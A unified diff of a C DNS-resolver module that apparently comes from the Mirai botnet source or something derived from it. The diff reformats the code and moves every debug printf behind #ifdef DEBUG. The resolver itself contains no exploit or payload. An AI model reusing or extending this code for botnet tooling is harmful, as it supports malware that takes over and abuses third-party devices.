@@ -1,6 +1,10 @@
 #define _GNU_SOURCE
 
+#ifdef DEBUG
 #include <stdio.h>
+#include <string.h>
+#endif
+
 #include <stdint.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -15,7 +19,6 @@
 #include "util.h"
 #include "rand.h"
 #include "protocol.h"
-
 
 void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
 {
@@ -46,42 +49,44 @@ static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
 {
     unsigned int jumped = 0, offset;
     *count = 1;
-    while(*reader != 0)
+    while (*reader != 0)
     {
-        if(*reader >= 192)
+        if (*reader >= 192)
         {
-            offset = (*reader)*256 + *(reader+1) - 49152;
+            offset = (*reader) * 256 + *(reader + 1) - 49152;
             reader = buffer + offset - 1;
             jumped = 1;
         }
-        reader = reader+1;
-        if(jumped == 0)
+        reader = reader + 1;
+        if (jumped == 0)
             *count = *count + 1;
     }
 
-    if(jumped == 1)
+    if (jumped == 1)
         *count = *count + 1;
 }
 
 struct resolv_entries *resolv_lookup(char *domain)
 {
-    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
+    struct resolv_entries *entries = calloc(1, sizeof(struct resolv_entries));
     char query[2048], response[2048];
+    util_zero(query, 2048);
+
     struct dnshdr *dnsh = (struct dnshdr *)query;
     char *qname = (char *)(dnsh + 1);
-
     resolv_domain_to_hostname(qname, domain);
 
     struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
     struct sockaddr_in addr = {0};
-    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
+
+    int query_len = sizeof(struct dnshdr) + util_strlen(qname) + 1 + sizeof(struct dns_question);
     int tries = 0, fd = -1, i = 0;
+
     uint16_t dns_id = rand_next() % 0xffff;
 
-    util_zero(&addr, sizeof (struct sockaddr_in));
+    util_zero(&addr, sizeof(struct sockaddr_in));
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
-    // addr.sin_addr.s_addr = INET_ADDR(1,1,1,1);
+    addr.sin_addr.s_addr = INET_ADDR(8, 8, 8, 8);
     addr.sin_port = htons(53);
 
     // Set up the dns query
@@ -101,22 +106,27 @@ struct resolv_entries *resolv_lookup(char *domain)
             close(fd);
         if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
         {
+#ifdef DEBUG
             printf("[resolv] Failed to create socket\n");
-
+#endif
             sleep(1);
             continue;
         }
 
-        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
         {
+#ifdef DEBUG
             printf("[resolv] Failed to call connect on udp socket\n");
+#endif
             sleep(1);
             continue;
         }
 
         if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
         {
+#ifdef DEBUG
             printf("[resolv] Failed to send packet: %d\n", errno);
+#endif
             sleep(1);
             continue;
         }
@@ -131,24 +141,30 @@ struct resolv_entries *resolv_lookup(char *domain)
 
         if (nfds == -1)
         {
+#ifdef DEBUG
             printf("[resolv] select() failed\n");
+#endif
             break;
         }
         else if (nfds == 0)
         {
+#ifdef DEBUG
             printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
+#endif
             continue;
         }
         else if (FD_ISSET(fd, &fdset))
         {
+#ifdef DEBUG
             printf("[resolv] Got response from select\n");
-            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
+#endif
+            int ret = recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
             char *name;
             struct dnsans *dnsa;
             uint16_t ancount;
             int stop;
 
-            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
+            if (ret < (sizeof(struct dnshdr) + util_strlen(qname) + 1 + sizeof(struct dns_question)))
                 continue;
 
             dnsh = (struct dnshdr *)response;
@@ -178,18 +194,22 @@ struct resolv_entries *resolv_lookup(char *domain)
                     {
                         uint32_t *p;
                         uint8_t tmp_buf[4];
-                        for(i = 0; i < 4; i++)
+                        for (i = 0; i < 4; i++)
                             tmp_buf[i] = name[i];
 
                         p = (uint32_t *)tmp_buf;
 
-                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
+                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof(ipv4_t));
                         entries->addrs[entries->addrs_len++] = (*p);
+#ifdef DEBUG
                         printf("[resolv] Found IP address: %08x\n", (*p));
+#endif
                     }
 
                     name = name + ntohs(r_data->data_len);
-                } else {
+                }
+                else
+                {
                     resolv_skip_name(name, response, &stop);
                     name = name + stop;
                 }
@@ -201,7 +221,9 @@ struct resolv_entries *resolv_lookup(char *domain)
 
     close(fd);
 
+#ifdef DEBUG
     printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
+#endif
 
     if (entries->addrs_len > 0)
         return entries;
